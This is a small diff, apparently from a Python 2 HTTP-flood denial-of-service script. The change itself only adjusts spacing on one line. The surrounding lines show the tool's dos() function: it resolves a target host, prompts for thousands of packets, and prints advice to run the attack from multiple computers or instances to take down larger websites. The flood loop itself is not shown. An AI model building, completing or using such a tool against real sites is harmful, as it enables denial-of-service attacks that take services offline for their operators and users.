@@ -79,7 +79,7 @@ def dos(host):
     #Mr.w0n63d4n
     print "[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n"
     print "[*]Host to attack: " + host
-    ip=socket.gethostbyname(host)
+    ip = socket.gethostbyname(host)
     print "[*]IP of the host: " + ip + "\n\n"
     conn = raw_input("Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
     silit = raw_input("Enter your message: ")
